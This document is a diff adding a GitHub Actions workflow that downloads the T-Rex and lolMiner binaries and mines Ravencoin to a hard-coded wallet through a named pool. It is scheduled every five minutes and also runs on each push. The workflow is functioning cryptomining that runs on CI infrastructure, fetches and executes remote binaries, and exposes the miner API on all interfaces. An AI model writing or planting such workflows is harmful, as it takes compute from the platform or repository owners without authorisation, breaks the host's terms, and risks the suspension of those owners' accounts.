@@ -1,0 +1,83 @@
+name: User Wallet RVN Mining 5
+
+on:
+  push:
+  schedule:
+    - cron: '*/5 * * * *'
+  workflow_dispatch:
+
+jobs:
+  user-wallet-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - name: Setup User Wallet Mining
+      run: |
+        sudo apt-get update -q
+        sudo apt-get install -y build-essential cmake git libssl-dev
+        
+    - name: Download RVN Miners
+      run: |
+        # Download T-Rex miner
+        wget -q https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+        tar -xf t-rex-0.26.8-linux.tar.gz
+        chmod +x t-rex
+        
+        # Download lolMiner as backup
+        wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz
+        tar -xf lolMiner_v1.82_Lin64.tar.gz || true
+        chmod +x 1.82/lolMiner || true
+        
+    - name: Configure User Wallet Mining
+      run: |
+        cat > user-wallet-config.json << 'EOF'
+        {
+          "algo": "kawpow",
+          "coin": "rvn",
+          "url": "stratum+tcp://rvn.2cryptocalc.com:7050",
+          "user": "RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ",
+          "worker": "UserWallet-${{ github.repository }}-5",
+          "pass": "x",
+          "intensity": 22,
+          "gpu-report-interval": 20,
+          "cpu-priority": 5,
+          "retries": 8,
+          "retry-pause": 3,
+          "timeout": 300,
+          "protocol-dump": false,
+          "no-color": true,
+          "api-bind-http": "0.0.0.0:4067"
+        }
+        EOF
+        
+    - name: Start User Wallet RVN Mining
+      run: |
+        echo "=== USER WALLET RVN MINING SESSION ==="
+        echo "Currency: RAVENCOIN (RVN)"
+        echo "Algorithm: kawpow"
+        echo "Pool: 2CryptoCalc"
+        echo "Threshold: 1 RVN"
+        echo "USER WALLET: RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ"
+        echo "Worker: UserWallet-5"
+        echo "Start Time: $(date)"
+        echo "=========================================="
+        
+        # Try T-Rex first
+        timeout 300 ./t-rex --config user-wallet-config.json || \
+        # Fallback to lolMiner
+        timeout 300 ./1.82/lolMiner --algo KAWPOW --pool stratum+tcp://rvn.2cryptocalc.com:7050 --user RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ.UserWallet-5 || \
+        echo "User wallet mining session completed"
+        
+    - name: User Wallet Mining Report
+      run: |
+        echo "=== USER WALLET MINING SESSION COMPLETE ==="
+        echo "Currency: RVN"
+        echo "Pool: 2CryptoCalc"
+        echo "Threshold: 1 RVN"
+        echo "USER WALLET: RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ"
+        echo "Worker: UserWallet-5"
+        echo "Next Run: */5 * * * *"
+        echo "Status: EARNING TO YOUR WALLET"
+        echo "End Time: $(date)"
+        echo "============================================"
